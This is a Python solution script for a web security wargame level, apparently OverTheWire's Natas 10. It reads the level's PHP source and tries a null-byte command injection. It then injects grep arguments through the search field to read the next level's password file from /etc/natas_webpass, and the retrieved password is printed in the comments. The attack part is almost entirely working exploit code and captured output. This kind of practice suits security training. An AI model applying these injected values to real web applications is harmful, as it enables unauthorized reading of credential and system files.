#!/usr/bin/env python
from driver import *


req=makeGetConnection()
# print req


# We see that acceptable chars are now limited. So we can expect those to include "\n ; "

# We stand corrected. "\n" is not checked for 
# It is ";|&"(see code below)
# # Lets get the source file. Shall we?

# req=makeGetConnection(target="index-source.html")
# print unescap_thml(req.text)


# /><form> />Find words containing: <input name=needle>
# <input type=submit name=submit value=Search><br><br> />
# </form> /> /> 
# />Output: /><pre> /><? />$key = ""; /> />
# if(array_key_exists("needle", $_REQUEST)) { 
# />    $key = $_REQUEST["needle"]; />
# } /> />if($key != "") { 
# />    if(preg_match('/[;|&amp;]/',$key)) { 
# />        print "Input contains an illegal character!"; />    
# } else { />     
#    passthru("grep -i $key dictionary.txt"); />    
# } />
# } />?> /></pre> /> 

#############################################################################
##########
#########			Give it another try. Shall we?
#######
############################################################################

# data = {
# 	"needle" : "binousalkdjfaf \x00 whoami",
# 	"submit" : True
# }
# _______________________ RESULT___________________________________
# <pre>
# <br />
# <b>Warning</b>:  passthru(): NULL byte detected. Possible attack in <b>/var/www/natas/natas10/index.php</b> on line <b>34</b><br />
# </pre>


# But we dont see any indication of a null check from the source code given to us. What the duce!!!!1




data = {
	"needle" : " -E '\w{32}' /etc/natas_webpass/natas11",
	"submit" : True
}

req = makeGetConnection(post=True, data=data)
# print req


# ------------------------------------RESULT___________________________________
# Output:
# <pre>
# /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
# </pre>

# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>













passwd = retrievePassword(req)

print_and_store_password(passwd)

